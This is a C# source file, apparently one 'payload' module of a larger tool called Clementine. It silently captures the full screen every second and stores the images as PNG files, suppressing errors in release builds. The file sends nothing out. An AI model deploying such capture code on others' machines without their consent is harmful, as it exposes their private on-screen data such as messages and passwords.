using System;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Clementine
{
    // Thanks to https://stackoverflow.com/questions/5049122/capture-the-screen-shot-using-net
    public sealed class Screenshotter : ParallelPayload
    {
        private Bitmap screenshot = null;
        private Graphics screen = null;
        private const string DirectoryName = "Screenshots";
        public readonly static string ScreenshotDirectory = Directory.CreateDirectory(Utilities.GetFileName(DirectoryName)).ToString();

        public Screenshotter() : base(1000 * 1)
        { }

        protected override void StartupTasks()
        {
            screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            screen = Graphics.FromImage(screenshot);
        }

        protected override void ShutdownTasks()
        {
            SaveScreenshot();
            screenshot.Dispose();
            screen.Dispose();
            screen = null;
            screenshot = null;
        }

        protected override void Payload()
        {
            screen.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshot.Size, CopyPixelOperation.SourceCopy);
            SaveScreenshot();
        }

        private void SaveScreenshot()
        {
            if (screenshot == null)
            {
                return;
            }
            var name = "screenshot" + DateTime.Now.Ticks + ".png";
            try
            {
                (new Bitmap(screenshot)).Save(Path.Combine(Utilities.GetClementineDirectory(), DirectoryName, name), ImageFormat.Png);
            }
            catch (Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
        }
    }
}
